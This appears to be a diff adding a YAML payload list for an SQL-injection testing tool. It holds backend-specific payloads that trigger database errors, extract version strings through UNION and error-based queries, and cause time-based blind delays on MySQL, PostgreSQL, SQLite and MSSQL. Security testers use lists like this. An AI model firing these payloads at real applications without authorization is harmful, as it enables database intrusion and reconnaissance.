@@ -1,0 +1,138 @@
+# Curated SQL-injection base payloads for authorized security testing.
+#
+# Context taxonomy used by PayloadMutator.mutate_by_category:
+#   error_trigger  — type-confusion probes that force a backend to emit an error
+#                    message and let the specialist fingerprint the DB.
+#   error_extract  — UNION / error-based extraction payloads, per backend.
+#   blind_timing   — time-based blind payloads; the specialist measures elapsed_ms
+#                    deltas against a baseline.
+#
+# Per-backend payloads carry ``prerequisites.backend`` so the specialist can
+# filter once a backend has been detected.
+
+# --- error_trigger (backend-agnostic) ---
+- id: sqli-quote-single
+  context: error_trigger
+  template: "'"
+  description: Unterminated single quote; the classic syntax-error trigger.
+
+- id: sqli-quote-double
+  context: error_trigger
+  template: '"'
+  description: Unterminated double quote.
+
+- id: sqli-quote-backtick
+  context: error_trigger
+  template: "`"
+  description: Unterminated backtick (MySQL identifier delimiter).
+
+- id: sqli-or-int
+  context: error_trigger
+  template: "' OR 1=1--"
+  description: Classic boolean breakout; exposes error if quoting mismatches.
+
+- id: sqli-union-null
+  context: error_trigger
+  template: "' UNION SELECT NULL--"
+  description: UNION probe; reveals column-count errors and backend syntax.
+
+- id: sqli-int-overflow
+  context: error_trigger
+  template: "99999999999999999999"
+  description: Integer overflow; surfaces ORM/driver errors without quotes.
+
+- id: sqli-stacked-semicolon
+  context: error_trigger
+  template: "'; SELECT 1--"
+  description: Stacked-query probe; some backends echo a clear rejection.
+
+# --- error_extract (per backend) ---
+- id: sqli-mysql-version
+  context: error_extract
+  prerequisites:
+    backend: mysql
+  template: "' UNION SELECT @@version,NULL,NULL-- -"
+  description: MySQL version via UNION.
+
+- id: sqli-mysql-extractvalue
+  context: error_extract
+  prerequisites:
+    backend: mysql
+  template: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -"
+  description: MySQL error-based XPATH extraction.
+
+- id: sqli-postgres-version
+  context: error_extract
+  prerequisites:
+    backend: postgres
+  template: "' UNION SELECT version()-- "
+  description: PostgreSQL version().
+
+- id: sqli-postgres-err-cast
+  context: error_extract
+  prerequisites:
+    backend: postgres
+  template: "' AND 1=CAST(version() AS INTEGER)-- "
+  description: PostgreSQL error-based cast; leaks version in the error string.
+
+- id: sqli-sqlite-version
+  context: error_extract
+  prerequisites:
+    backend: sqlite
+  template: "' UNION SELECT sqlite_version()-- "
+  description: SQLite sqlite_version() via UNION.
+
+- id: sqli-mssql-version
+  context: error_extract
+  prerequisites:
+    backend: mssql
+  template: "' UNION SELECT @@VERSION-- "
+  description: MSSQL @@VERSION via UNION.
+
+- id: sqli-mssql-err-convert
+  context: error_extract
+  prerequisites:
+    backend: mssql
+  template: "' AND 1=CONVERT(int,@@VERSION)-- "
+  description: MSSQL CONVERT() error-based extraction.
+
+# --- blind_timing (per backend) ---
+- id: sqli-blind-mysql-sleep
+  context: blind_timing
+  prerequisites:
+    backend: mysql
+  template: "' AND SLEEP(5)-- "
+  description: MySQL SLEEP(5) conditional delay.
+
+- id: sqli-blind-mysql-benchmark
+  context: blind_timing
+  prerequisites:
+    backend: mysql
+  template: "' AND BENCHMARK(5000000,MD5(0x41))-- "
+  description: MySQL BENCHMARK(); fallback when SLEEP is filtered.
+
+- id: sqli-blind-postgres-sleep
+  context: blind_timing
+  prerequisites:
+    backend: postgres
+  template: "'; SELECT pg_sleep(5)-- "
+  description: PostgreSQL pg_sleep(5).
+
+- id: sqli-blind-mssql-waitfor
+  context: blind_timing
+  prerequisites:
+    backend: mssql
+  template: "'; WAITFOR DELAY '0:0:5'-- "
+  description: MSSQL WAITFOR DELAY.
+
+- id: sqli-blind-sqlite-randomblob
+  context: blind_timing
+  prerequisites:
+    backend: sqlite
+  template: "' AND (SELECT COUNT(*) FROM (SELECT RANDOMBLOB(2000000000)))-- "
+  description: SQLite compute-bound delay via RANDOMBLOB.
+
+- id: sqli-blind-generic-or-sleep
+  context: blind_timing
+  template: "' OR SLEEP(5)-- "
+  description: Generic OR-SLEEP probe; fires on MySQL/MariaDB.
